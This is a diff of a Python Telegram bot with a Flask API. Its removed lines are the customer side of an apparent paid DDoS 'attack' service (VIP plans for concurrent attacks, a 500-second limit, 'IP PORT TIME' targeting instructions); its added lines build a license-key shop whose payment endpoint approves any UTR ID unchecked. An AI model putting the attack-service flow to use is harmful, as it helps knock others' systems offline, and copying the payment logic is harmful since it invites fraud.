+@bot.callback_query_handler(func=lambda call: call.data in ["del_single_menu", "del_sold_menu_main", "del_all_menu_main"])
+def callback_delete_submenus(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+
+    user_id = call.from_user.id
+    data = call.data
+
+    if data == "del_single_menu":
+        bot.answer_callback_query(call.id)
+        user_states[user_id] = {"type": "waiting_del_single"}
+        bot.send_message(
+            call.message.chat.id,
+            "💬 Jis key ko delete karna hai uska **Key ID** ya **License Key** yahan send karein:",
+            parse_mode="Markdown"
         )
-        
-        user_states[user_id] = {
-            "action": "waiting_vip_screenshot",
-            "duration": duration,
-            "days": days,
-            "amount": amount,
-            "qr_msg_id": sent_msg.message_id,
-            "screenshot_received": False,
-            "file_id": None,
-            "timestamp": time.time()
-        }
 
-        def expire_qr_code():
-            time.sleep(300)
-            if user_id in user_states and user_states[user_id].get("qr_msg_id") == sent_msg.message_id:
-                user_states.pop(user_id, None)
-                try:
-                    bot.delete_message(chat_id, sent_msg.message_id)
-                    bot.send_message(chat_id, "⌛ **QR CODE EXPIRED & DELETED!** 5 MINUTES KA TIME KHATAM HO CHUKA HAI.", parse_mode="Markdown")
-                except Exception:
-                    pass
+    elif data == "del_sold_menu_main":
+        bot.answer_callback_query(call.id)
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("⏱️ Delete Sold Keys by Duration", callback_data="del_sold_by_duration_menu"),
+            types.InlineKeyboardButton("🔥 Delete All Sold Keys", callback_data="conf_del_sold_ALL"),
+            types.InlineKeyboardButton("🔙 Back", callback_data="del_main_menu_back")
+        )
 
-        threading.Thread(target=expire_qr_code, daemon=True).start()
+        bot.edit_message_text(
+            "🗑️ *DELETE SOLD KEYS OPTIONS*\n\n"
+            "Aap kis tarah ki sold keys delete karna chahte hain select karein:",
+            call.message.chat.id,
+            call.message.message_id,
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
 
-    except Exception as e:
-        bot.send_message(chat_id, f"QR CODE GENERATE KARNE MEIN ERROR AAYI. UPI ID: `{UPI_ID}` PAR PAY KAREIN (AMOUNT: ₹{amount})", parse_mode="Markdown")
+    elif data == "del_all_menu_main":
+        bot.answer_callback_query(call.id)
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("⏱ Delete Key by Duration", callback_data="del_by_duration_menu"),
+            types.InlineKeyboardButton("🔥 Delete All Duration Keys", callback_data="del_dur_prompt_ALL"),
+            types.InlineKeyboardButton("🔙 Back", callback_data="del_main_menu_back"),
+            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_del_all")
+        )
 
-@bot.message_handler(content_types=['photo'], func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_vip_screenshot")
-def process_vip_screenshot(message):
-    user_id = str(message.chat.id)
-    state = user_states.get(user_id)
+        bot.edit_message_text(
+            "🗑️ *DELETE ALL OPTIONS*\n\n"
+            "Aap kya delete karna chahte hain select karein:",
+            call.message.chat.id,
+            call.message.message_id,
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
+
+
+@bot.callback_query_handler(func=lambda call: call.data == "del_main_menu_back")
+def callback_del_main_menu_back(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+    bot.answer_callback_query(call.id)
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("🗑️ Single Delete", callback_data="del_single_menu"),
+        types.InlineKeyboardButton("🗑️ Delete Sold Keys", callback_data="del_sold_menu_main"),
+        types.InlineKeyboardButton("🗑️ Delete All", callback_data="del_all_menu_main"),
+    )
+    bot.edit_message_text(
+        "🗑️ *DELETE STOCK OPTIONS*\n\n"
+        "Niche diye gaye options mein se select karein:",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
+
+@bot.callback_query_handler(func=lambda call: call.data == "del_sold_by_duration_menu")
+def callback_del_sold_by_duration_menu(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+
+    bot.answer_callback_query(call.id)
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    durations = ["5 Hour", "1 Day", "7 Day", "30 Day"]
+    for d in durations:
+        cb_val = d.replace(" ", "_")
+        markup.add(types.InlineKeyboardButton(f"🗑 Sold {d}", callback_data=f"conf_del_sold_{cb_val}"))
     
-    if not state:
+    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="del_sold_menu_main"))
+
+    bot.edit_message_text(
+        "⏱️ *DELETE SOLD KEYS BY DURATION*\n\n"
+        "Kis duration ki sold keys delete karni hain select karein:",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
+
+@bot.callback_query_handler(func=lambda call: call.data == "del_by_duration_menu")
+def callback_del_by_duration_menu(call):
+    if call.from_user.id != ADMIN_ID:
         return
 
-    if time.time() - state["timestamp"] > 300:
-        user_states.pop(user_id, None)
-        bot.reply_to(message, "❌ **QR EXPIRED!** TIME LIMIT KHATAM HO CHUKI THI.")
+    bot.answer_callback_query(call.id)
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    durations = ["5 Hour", "1 Day", "7 Day", "30 Day"]
+    for d in durations:
+        cb_val = d.replace(" ", "_")
+        markup.add(types.InlineKeyboardButton(f"🗑 {d}", callback_data=f"del_dur_prompt_{cb_val}"))
+    
+    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="del_all_menu_main"))
+
+    bot.edit_message_text(
+        "⏱️ *DELETE KEY BY DURATION*\n\n"
+        "Kis duration ki keys delete karni hain select karein:",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("del_dur_prompt_") or call.data == "cancel_del_all")
+def callback_del_dur_prompt(call):
+    if call.from_user.id != ADMIN_ID:
         return
 
-    file_id = message.photo[-1].file_id
-    state["screenshot_received"] = True
-    state["file_id"] = file_id
-
-    bot.reply_to(message, "✅ **SCREENSHOT RECEIVED SUCCESSFULLY!** AB NICHE 'VERIFY' BUTTON PAR CLICK KAREIN.", parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data in ["vip_verify", "vip_cancel"])
-def handle_vip_qr_actions(call):
-    user_id = str(call.message.chat.id)
-    chat_id = call.message.chat.id
-    state = user_states.get(user_id)
-
-    if call.data == "vip_cancel":
-        if state and state.get("qr_msg_id"):
-            try:
-                bot.delete_message(chat_id, state["qr_msg_id"])
-            except Exception:
-                pass
-        user_states.pop(user_id, None)
-        bot.answer_callback_query(call.id, "ORDER CANCELLED!")
-        bot.send_message(chat_id, "WELCOME TO R2FSUNILYT MAIN MENU", parse_mode="Markdown", reply_markup=get_main_reply_keyboard())
-        return
-
-    if call.data == "vip_verify":
-        if not state:
-            bot.answer_callback_query(call.id, "SESSION EXPIRED!", show_alert=True)
-            return
-
-        if not state.get("screenshot_received") or not state.get("file_id"):
-            bot.answer_callback_query(call.id, "PLEASE SEND PAYMENT SCREENSHOT THEN CLICK VERIFY", show_alert=True)
-            return
-
-        duration = state["duration"]
-        days = state["days"]
-        amount = state["amount"]
-        file_id = state["file_id"]
-        qr_msg_id = state.get("qr_msg_id")
-
-        user_states.pop(user_id, None)
-        if qr_msg_id:
-            try:
-                bot.delete_message(chat_id, qr_msg_id)
-            except Exception:
-                pass
-
-        bot.answer_callback_query(call.id, "VERIFICATION SUBMITTED!")
-        bot.send_message(chat_id, "✅ **SCREENSHOT VERIFIED & SENT!** ADMIN KE PAAS APPROVAL KE LIYE BHEJ DIYA GAYA HAI.", parse_mode="Markdown")
-
-        admin_markup = types.InlineKeyboardMarkup(row_width=2)
-        admin_markup.add(
-            types.InlineKeyboardButton("✅ APPROVE", callback_data=f"vip_app_{user_id}_{duration}"),
-            types.InlineKeyboardButton("❌ REJECT", callback_data=f"vip_rej_{user_id}")
-        )
-
+    if call.data == "cancel_del_all":
+        bot.answer_callback_query(call.id, "Cancelled.")
         try:
-            user_info = bot.get_chat(int(user_id))
-            username = "@" + user_info.username if user_info.username else f"ID: {user_id}"
+            bot.delete_message(call.message.chat.id, call.message.message_id)
         except Exception:
-            username = f"ID: {user_id}"
-
-        admin_caption = (
-            f"🔔 **NEW VIP PAYMENT REQUEST**\n\n"
-            f"👤 USER: {username} (`{user_id}`)\n"
-            f"📦 PLAN: {duration.upper()} ({days} DAYS)\n"
-            f"💵 AMOUNT: ₹{amount}"
+            pass
+        bot.send_message(
+            call.message.chat.id,
+            "👑 *SUPER ADMIN CONTROL PANEL*\n\n"
+            "Niche diye gaye options select karein:",
+            parse_mode="Markdown",
+            reply_markup=get_main_reply_keyboard(),
         )
-
-        try:
-            bot.send_photo(int(OWNER_ID), file_id, caption=admin_caption, parse_mode="Markdown", reply_markup=admin_markup)
-        except Exception as e:
-            logging.error(f"Failed to send VIP screenshot to owner: {e}")
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("vip_app_") or call.data.startswith("vip_rej_"))
-def handle_vip_approval(call):
-    if str(call.message.chat.id) != OWNER_ID and str(call.message.chat.id) not in ADMIN_IDS:
-        bot.answer_callback_query(call.id, "❌ AAPKE PAAS PERMISSION NAHI HAI!", show_alert=True)
         return
 
-    data = call.data.split("_")
-    action = data[1]
-    target_user_id = data[2]
+    target = call.data.replace("del_dur_prompt_", "")
+    display_name = "All Durations" if target == "ALL" else target.replace("_", " ")
 
-    if action == "app":
-        duration = data[3]
-        days = 7 if duration == "week" else 30
-        expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("✅ Yes, I am 100% Sure", callback_data=f"conf_del_{target}"),
+        types.InlineKeyboardButton("❌ No, I am not Sure", callback_data="cancel_del_all")
+    )
+    bot.answer_callback_query(call.id)
+    bot.edit_message_text(
+        f"⚠️ *WARNING:* Kya aap pakka `{display_name}` ki saari keys delete karna chahte hain?",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
 
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"expiration": expiration_date, "is_vip": True, "approved_by": str(call.message.chat.id)}},
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("conf_del_"))
+def callback_confirm_deletion(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+
+    target = call.data.replace("conf_del_", "")
+
+    if target == "ALL":
+        res = keys_collection.delete_many({})
+        bot.answer_callback_query(call.id, "All keys deleted successfully!", show_alert=True)
+        bot.send_message(
+            call.message.chat.id,
+            f"✅ Database ki saari keys (`{res.deleted_count}` keys) successfully delete kar di gayi hain!",
+            parse_mode="Markdown",
+            reply_markup=get_main_reply_keyboard()
+        )
+    else:
+        duration = target.replace("_", " ")
+        res = keys_collection.delete_many({"duration": duration})
+        bot.answer_callback_query(call.id, f"{res.deleted_count} keys deleted!", show_alert=True)
+        bot.send_message(
+            call.message.chat.id,
+            f"✅ *{duration}* ki saari keys (`{res.deleted_count}` keys) successfully delete kar di gayi hain!",
+            parse_mode="Markdown",
+            reply_markup=get_main_reply_keyboard()
+        )
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("conf_del_sold_"))
+def callback_confirm_sold_deletion(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+
+    target = call.data.replace("conf_del_sold_", "")
+
+    if target == "ALL":
+        res = keys_collection.delete_many({"status": "used"})
+        bot.answer_callback_query(call.id, "All sold keys deleted successfully!", show_alert=True)
+        bot.send_message(
+            call.message.chat.id,
+            f"✅ Database ki saari sold/used keys (`{res.deleted_count}` keys) successfully delete kar di gayi hain!",
+            parse_mode="Markdown",
+            reply_markup=get_main_reply_keyboard()
+        )
+    else:
+        duration = target.replace("_", " ")
+        res = keys_collection.delete_many({"duration": duration, "status": "used"})
+        bot.answer_callback_query(call.id, f"{res.deleted_count} sold keys deleted!", show_alert=True)
+        bot.send_message(
+            call.message.chat.id,
+            f"✅ *{duration}* ki saari sold/used keys (`{res.deleted_count}` keys) successfully delete kar di gayi hain!",
+            parse_mode="Markdown",
+            reply_markup=get_main_reply_keyboard()
+        )
+
+
+# ============================================================
+# 6. SHOW SOLD KEY HANDLER
+# ============================================================
+
+def handle_show_sold_key_direct(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    keys = list(
+        keys_collection.find(
+            {"status": "used"},
+            {"id": 1, "duration": 1, "license_key": 1, "assigned_to": 1}
+        ).sort("id", DESCENDING).limit(30)
+    )
+
+    if not keys:
+        sent_msg = bot.send_message(
+            message.chat.id,
+            "❌ Abhi tak koi bhi key use/sold nahi hui hai.",
+            parse_mode="Markdown",
+            reply_markup=get_main_reply_keyboard(),
+        )
+        user_states[user_id] = {"response_msg_id": sent_msg.message_id}
+        return
+
+    text = "📋 *RECENT SOLD / USED KEYS (Last 30):*\n\n"
+
+    for key in keys:
+        kid = key["id"]
+        dur = key.get("duration", "")
+        lkey = key.get("license_key", "")
+        assigned = key.get("assigned_to", "Unknown")
+
+        text += (
+            f"🆔 ID: `{kid}` | *{dur}*\n"
+            f"🔑 `{lkey}`\n"
+            f"👤 Assigned: `{assigned}`\n\n"
+        )
+
+    sent_msg = bot.send_message(
+        message.chat.id,
+        text,
+        parse_mode="Markdown",
+        reply_markup=get_main_reply_keyboard(),
+    )
+    user_states[user_id] = {"response_msg_id": sent_msg.message_id}
+
+
+# ============================================================
+# ADMIN REVOKE / DELETE KEY FROM PAYMENT NOTIFICATION
+# ============================================================
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("rev_key_"))
+def callback_revoke_key_from_payment(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "❌ Unauthorized!", show_alert=True)
+        return
+
+    try:
+        key_id = int(call.data.replace("rev_key_", ""))
+        result = keys_collection.delete_one({"id": key_id})
+
+        if result.deleted_count > 0:
+            bot.answer_callback_query(call.id, "Key deleted successfully!", show_alert=True)
+            bot.edit_message_text(
+                call.message.text + "\n\n❌ *STATUS: Key has been deleted/revoked by Admin.*",
+                call.message.chat.id,
+                call.message.message_id,
+                parse_mode="Markdown"
+            )
+        else:
+            bot.answer_callback_query(call.id, "❌ Key already deleted or not found.", show_alert=True)
+    except Exception as e:
+        bot.answer_callback_query(call.id, f"❌ Error: {e}", show_alert=True)
+
+
+# ============================================================
+# STATE INPUT HANDLER (FOR ADDING & DELETING KEYS)
+# ============================================================
+
+@bot.message_handler(
+    func=lambda message:
+        message.from_user.id == ADMIN_ID
+        and message.from_user.id in user_states
+        and user_states[message.from_user.id].get("type")
+        in ["waiting_add_single_key", "waiting_add_bulk_keys", "waiting_del_single"]
+)
+def handle_user_state_input(message):
+    user_id = message.from_user.id
+    state = user_states[user_id]
+    action_type = state["type"]
+    text = (message.text or "").strip()
+
+    if text in ["🔑 GENERATE KEY", "📊 CHECK STOCK", "➕ ADD SINGLE", "📦 ADD BULK", "🗑️ DELETE KEY", "📋 SHOW SOLD KEY", "🔚 BACK"]:
+        return
+
+    if action_type == "waiting_add_single_key":
+        duration = state.get("duration")
+        del user_states[user_id]
+        if not text:
+            bot.reply_to(message, "❌ Key empty nahi ho sakti!", reply_markup=get_main_reply_keyboard())
+            return
+        try:
+            new_id = get_next_id("key_id")
+            keys_collection.insert_one({
+                "id": new_id,
+                "duration": duration,
+                "license_key": text,
+                "status": "unused",
+                "assigned_to": None
+            })
+            bot.reply_to(message, f"✅ Single Key successfully added!\n• Duration: {duration}\n• Key: `{text}`", parse_mode="Markdown", reply_markup=get_main_reply_keyboard())
+        except DuplicateKeyError:
+            bot.reply_to(message, "❌ Yeh license key pehle se database mein mojood hai!", reply_markup=get_main_reply_keyboard())
+        except Exception as e:
+            bot.reply_to(message, f"❌ Error: {e}", reply_markup=get_main_reply_keyboard())
+
+    elif action_type == "waiting_add_bulk_keys":
+        duration = state.get("duration")
+        del user_states[user_id]
+        lines = [line.strip() for line in text.split("\n") if line.strip()]
+        if not lines:
+            bot.reply_to(message, "❌ Koi keys nahi mili!", reply_markup=get_main_reply_keyboard())
+            return
+        added_count = 0
+        duplicate_count = 0
+        for line in lines:
+            try:
+                new_id = get_next_id("key_id")
+                keys_collection.insert_one({
+                    "id": new_id,
+                    "duration": duration,
+                    "license_key": line,
+                    "status": "unused",
+                    "assigned_to": None
+                })
+                added_count += 1
+            except DuplicateKeyError:
+                duplicate_count += 1
+            except Exception:
+                pass
+
+        bot.reply_to(
+            message,
+            f"📦 *BULK ADD REPORT*\n\n"
+            f"• *Duration:* {duration}\n"
+            f"• *Successfully Added:* `{added_count}`\n"
+            f"• *Duplicates (Skipped):* `{duplicate_count}`",
+            parse_mode="Markdown",
+            reply_markup=get_main_reply_keyboard()
+        )
+
+    elif action_type == "waiting_del_single":
+        del user_states[user_id]
+        query = text
+        try:
+            if query.isdigit():
+                result = keys_collection.delete_one({"id": int(query)})
+            else:
+                result = keys_collection.delete_one({"license_key": query})
+
+            if result.deleted_count > 0:
+                bot.reply_to(message, f"✅ Key successfully delete kar di gayi hai!", reply_markup=get_main_reply_keyboard())
+            else:
+                bot.reply_to(message, f"❌ Yeh key database mein nahi mili.", reply_markup=get_main_reply_keyboard())
+        except Exception as e:
+            bot.reply_to(message, f"❌ Error: {e}", reply_markup=get_main_reply_keyboard())
+
+
+# ============================================================
+# FLASK SERVER & APIS (FOR APP / WEB INTEGRATION)
+# ============================================================
+
+app = Flask(__name__)
+
+
+@app.route("/")
+def home():
+    return "BOT & API SERVER IS ACTIVE AND RUNNING WITH MONGODB & REAL-TIME CHAT SUPPORT!"
+
+
+@app.route('/api/submit_free_task', methods=['POST'])
+def submit_free_task():
+    data = request.json or {}
+    device_id = data.get("device_id")
+
+    if not device_id:
+        return jsonify({"status": "error", "message": "❌ Device ID missing hai!"}), 400
+
+    current_time = time.time()
+    cooldown_duration = 5 * 60 * 60
+
+    cooldown_record = device_cooldowns_collection.find_one({"device_id": device_id})
+    if cooldown_record:
+        last_time = cooldown_record.get("last_claimed_time", 0)
+        if current_time - last_time < cooldown_duration:
+            remaining_seconds = int(cooldown_duration - (current_time - last_time))
+            hours = remaining_seconds // 3600
+            mins = (remaining_seconds % 3600) // 60
+            return jsonify({
+                "status": "error",
+                "message": f"❌ Aapko agli free key {hours} ghante {mins} minute baad milegi!"
+            }), 400
+
+    key_doc = keys_collection.find_one({"duration": "5 Hour", "status": "unused"}, {"id": 1, "license_key": 1})
+    if not key_doc:
+        return jsonify({"status": "error", "message": "❌ Free key stock filhaal khatam ho gaya hai!"}), 400
+
+    key_id = key_doc["id"]
+    license_key = key_doc["license_key"]
+
+    assigned = keys_collection.find_one_and_update(
+        {"id": key_id, "status": "unused"},
+        {"$set": {"status": "used", "assigned_to": f"Device: {device_id}"}},
+        return_document=True
+    )
+
+    if not assigned:
+        return jsonify({"status": "error", "message": "❌ Key pehle hi assign ho chuki hai, dubara try karein."}), 400
+
+    device_cooldowns_collection.update_one(
+        {"device_id": device_id},
+        {"$set": {"last_claimed_time": current_time}},
+        upsert=True
+    )
+
+    return jsonify({"status": "success", "key": license_key})
+
+
+@app.route('/api/submit_payment', methods=['POST'])
+def submit_payment():
+    data = request.json or {}
+    utr = data.get("utr")
+    plan = data.get("plan")
+    amount = data.get("amount")
+
+    if not utr or not plan:
+        return jsonify({"error": "Invalid data, UTR and Plan required"}), 400
+
+    existing_payment = payments_collection.find_one({"utr": utr})
+    if existing_payment and existing_payment.get("status") == "approved":
+        return jsonify({
+            "status": "success",
+            "message": "Payment already processed",
+            "key": existing_payment.get("key", "")
+        })
+
+    key_row = keys_collection.find_one(
+        {"duration": plan, "status": "unused"},
+        {"id": 1, "license_key": 1}
+    )
+
+    if not key_row:
+        payments_collection.update_one(
+            {"utr": utr},
+            {"$set": {"status": "out_of_stock", "plan": plan, "amount": amount, "key": ""}},
             upsert=True
         )
-
-        bot.answer_callback_query(call.id, "✅ VIP APPROVED SUCCESSFULLY!")
-        bot.edit_message_caption(
-            f"{call.message.caption}\n\nSTATUS: **APPROVED ✅** BY ADMIN",
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            parse_mode="Markdown"
-        )
-
         try:
             bot.send_message(
-                int(target_user_id),
-                f"🎉 **VIP ACCESS APPROVED!**\n\nAAPKA {duration.upper()} VIP PLAN ACTIVATE HO GAYA HAI ({days} DAYS). AB AAP UNLIMITED AUR MULTIPLE CONCURRENT ATTACKS RUN KAR SAKTE HAIN! 🚀",
+                ADMIN_ID,
+                f"⚠ *PAYMENT RECEIVED - OUT OF STOCK!*\n\n"
+                f"📦 *Plan:* {plan}\n"
+                f"💰 *Amount:* ₹{amount}\n"
+                f"💳 *UTR ID:* `{utr}`\n"
+                f"❌ Stock khatam ho gaya hai! Kripya key add karein.",
                 parse_mode="Markdown"
             )
         except Exception:
             pass
+        return jsonify({"status": "error", "message": "Stock empty for this plan"}), 400
 
-    elif action == "rej":
-        bot.answer_callback_query(call.id, "❌ PAYMENT REJECTED.")
-        bot.edit_message_caption(
-            f"{call.message.caption}\n\nSTATUS: **REJECTED ❌** BY ADMIN",
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            parse_mode="Markdown"
+    key_id = key_row["id"]
+    license_key = key_row["license_key"]
+    buy_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+
+    assigned_key = keys_collection.find_one_and_update(
+        {"id": key_id, "status": "unused"},
+        {"$set": {"status": "used", "assigned_to": f"UTR: {utr}"}},
+        return_document=True
+    )
+
+    if not assigned_key:
+        return jsonify({"status": "error", "message": "Key assignment failed, please try again."}), 400
+
+    payments_collection.update_one(
+        {"utr": utr},
+        {
+            "$set": {
+                "status": "approved",
+                "plan": plan,
+                "amount": amount,
+                "key": license_key,
+                "key_id": key_id,
+                "buy_time": buy_time
+            }
+        },
+        upsert=True
+    )
+
+    msg = (
+        f"✅ *AUTO-APPROVED PAYMENT & KEY GIVEN!*\n\n"
+        f"📦 *Plan / Duration:* {plan}\n"
+        f"💰 *Price / Amount:* ₹{amount}\n"
+        f"💳 *UTR ID:* `{utr}`\n"
+        f"🕒 *Buy Time:* {buy_time}\n"
+        f"🔑 *Assigned Key:* `{license_key}`\n\n"
+        f"Admin Actions:"
+    )
+
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("🗑️ Delete/Revoke This Key", callback_data=f"rev_key_{key_id}")
+    )
+
+    try:
+        bot.send_message(ADMIN_ID, msg, parse_mode="Markdown", reply_markup=markup)
+    except Exception as e:
+        print("Telegram send error:", e)
+
+    return jsonify({"status": "success", "key": license_key})
+
+
+@app.route('/api/check_status/<utr>', methods=['GET'])
+def check_status(utr):
+    payment_info = payments_collection.find_one({"utr": utr})
+    if not payment_info:
+        return jsonify({"status": "pending"})
+
+    return jsonify({
+        "status": payment_info.get("status", "pending"),
+        "key": payment_info.get("key", "")
+    })
+
+
+@app.route('/api/send_chat', methods=['POST'])
+def send_chat():
+    data = request.json or {}
+    device_id = data.get("device_id")
+    sender = data.get("sender", "user")
+    message = data.get("message", "")
+    media_url = data.get("media_url", "")
+
+    if not device_id or (not message and not media_url):
+        return jsonify({"error": "device_id and message/media required"}), 400
+
+    chat_doc = {
+        "device_id": device_id,
+        "sender": sender,
+        "message": message,
+        "media_url": media_url,
+        "timestamp": time.time()
+    }
+    chats_collection.insert_one(chat_doc)
+
+    broadcast_message(device_id, {
+        "sender": sender,
+        "message": message,
+        "media_url": media_url
+    })
+
+    if sender == "user":
+        admin_msg = (
+            f"💬 *NEW CHAT FROM APP*\n\n"
+            f"🆔 *Device ID:* `{device_id}`\n\n"
+            f"📝 *Message:*\n{message}"
         )
-
         try:
-            bot.send_message(
-                int(target_user_id),
-                "❌ **VIP PAYMENT REJECTED!** AAPKA PAYMENT SCREENSHOT VERIFY NAHI HO PAYA.",
-                parse_mode="Markdown"
-            )
-        except Exception:
-            pass
-
-@bot.message_handler(func=lambda message: message.text == "💰 CHECK BALANCE")
-def menu_check_balance(message):
-    user_id = str(message.chat.id)
-    user_cred = credits_collection.find_one({"user_id": user_id})
-    balance = user_cred["balance"] if user_cred else 0
-    
-    user_data = users_collection.find_one({"user_id": user_id}) or {}
-    free_attacks = user_data.get("free_attacks", 5)
-    is_vip = user_data.get("is_vip", False)
-    vip_status = "ACTIVE 🌟" if is_vip and is_user_allowed(user_id) else "INACTIVE ❌"
-    
-    response = (
-        f"💰 **ACCOUNT BALANCE DETAILS:**\n\n"
-        f"🪙 COINS BALANCE: `{balance}`\n"
-        f"🆓 FREE ATTACKS LEFT: `{free_attacks}`\n\n"
-        f"💎 VIP STATUS: `{vip_status}`"
-    )
-    bot.send_message(message.chat.id, response, parse_mode="Markdown")
-
-@bot.message_handler(func=lambda message: message.text == "🔗 REFER & EARN")
-def menu_refer_earn(message):
-    bot_info = bot.get_me()
-    user_id = str(message.chat.id)
-    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"
-    
-    response = (
-        "🔗 **REFER & EARN PROGRAM**\n\n"
-        "APNI REFERRAL LINK SHARE KAREIN. JAB KOI NAYA USER JOIN KEREGA, AAPKO **10 COINS** MILENGE!\n\n"
-        f"👉 YOUR LINK:\n`{ref_link}`"
-    )
-    bot.send_message(message.chat.id, response, parse_mode="Markdown")
-
-@bot.message_handler(func=lambda message: message.text == "📅 DAILY CHECK-IN")
-def menu_daily_checkin(message):
-    user_id = str(message.chat.id)
-    now = datetime.datetime.now()
-    
-    user_data = users_collection.find_one({"user_id": user_id}) or {}
-    last_checkin = user_data.get("last_checkin")
-    
-    if last_checkin and (now - last_checkin).total_seconds() < 86400:
-        remaining = int(86400 - (now - last_checkin).total_seconds())
-        hours = remaining // 3600
-        minutes = (remaining % 3600) // 60
-        bot.send_message(message.chat.id, f"⏳ AAPNE AAJ KA CHECK-IN ALREADY CLAIM KAR LIYA HAI! AGLA CHECK-IN `{hours}H {minutes}M` BAAD MILEGA.", parse_mode="Markdown")
-        return
-    
-    users_collection.update_one(
-        {"user_id": user_id},
-        {"$set": {"last_checkin": now}},
-        upsert=True
-    )
-    credits_collection.update_one(
-        {"user_id": user_id},
-        {"$inc": {"balance": 20}},
-        upsert=True
-    )
-    bot.send_message(message.chat.id, "🎉 **DAILY CHECK-IN SUCCESSFUL!** AAPKO **20 COINS** REWARD MILE HAIN 🪙.", parse_mode="Markdown")
-
-@bot.message_handler(func=lambda message: message.text == "⚠️ RULES")
-def menu_rules(message):
-    response = (
-        "⚠️ **BOT RULES:**\n\n"
-        "1. FREE USERS EK WAQT PAR EK HI ATTACK RUN KAR SAKTE HAIN.\n"
-        "2. VIP USERS MULTIPLE CONCURRENT ATTACKS RUN KAR SAKTE HAIN.\n"
-        "3. MAXIMUM ATTACK TIME LIMIT **500 SECONDS** HAI."
-    )
-    bot.send_message(message.chat.id, response, parse_mode="Markdown")
-
-@bot.message_handler(func=lambda message: message.text == "🛠️ HELP")
-def menu_help(message):
-    response = (
-        "🛠️ *R2F BOT HELP & SUPPORT CENTER*\n\n"
-        "NICHE DIYE GAYE BUTTONS PAR CLICK KAREIN:"
-    )
-    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_help_inline_keyboard())
-
-@bot.callback_query_handler(func=lambda call: call.data == "help_support")
-def callback_help_support(call):
-    bot.answer_callback_query(call.id)
-    bot.send_message(
-        call.message.chat.id,
-        "📞 *CONTACT SUPPORT*\n\n"
-        "KISI BHI PROBLEM YA VIP APPROVAL KE LIYE CONTACT KAREIN:\n"
-        f"👉 OWNER ID: `{OWNER_ID}`",
-        parse_mode="Markdown"
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data == "help_how_to_use")
-def callback_help_tutorial(call):
-    bot.answer_callback_query(call.id)
-    bot.send_message(
-        call.message.chat.id,
-        "📖 *HOW TO USE GUIDE*\n\n"
-        "1. **⚡ QUICK ATTACK** BUTTON DABAYEIN.\n"
-        "2. `IP PORT TIME` SPACE DEKAR BHEJEIN (JAISE: `192.168.1.1 80 300`).\n"
-        "3. ATTACK START HONE PAR NOTIFICATION MILEGI.",
-        parse_mode="Markdown"
-    )
-
-@bot.message_handler(commands=['approveuser'])
-def approve_user(message):
-    user_id = str(message.chat.id)
-    if user_id in ADMIN_IDS or user_id == OWNER_ID:
-        command = message.text.split()
-        if len(command) == 3:
-            user_to_approve = command[1]
-            duration = command[2].lower()
-            if duration not in ["day", "week", "month"]:
-                bot.send_message(message.chat.id, "INVALID DURATION. USE 'DAY', 'WEEK', OR 'MONTH'.")
-                return
-
-            days_add = 1 if duration == "day" else (7 if duration == "week" else 30)
-            expiration_date = datetime.datetime.now() + datetime.timedelta(days=days_add)
-            
-            users_collection.update_one(
-                {"user_id": user_to_approve},
-                {"$set": {"expiration": expiration_date, "approved_by": user_id, "is_vip": True}},
-                upsert=True
-            )
-            response = f"USER {user_to_approve} APPROVED FOR {duration.upper()} 👍."
-        else:
-            response = "USAGE: /approveuser <id> <duration>"
-    else:
-        response = "ONLY ADMIN OR OWNER CAN RUN THIS COMMAND 😡."
-    bot.send_message(message.chat.id, response)
-
-@bot.message_handler(commands=['redeem'])
-def redeem_gift(message):
-    user_id = str(message.chat.id)
-    command = message.text.split()
-    if len(command) == 2:
-        code = command[1]
-        gift = gift_codes_collection.find_one({"code": code})
-        if gift:
-            duration = gift["duration"]
-            gift_codes_collection.delete_one({"code": code})
-            
-            days_add = 1 if duration == "day" else (7 if duration == "week" else 30)
-            expiration_date = datetime.datetime.now() + datetime.timedelta(days=days_add)
-            
-            users_collection.update_one(
-                {"user_id": user_id},
-                {"$set": {"expiration": expiration_date, "is_vip": True}},
-                upsert=True
-            )
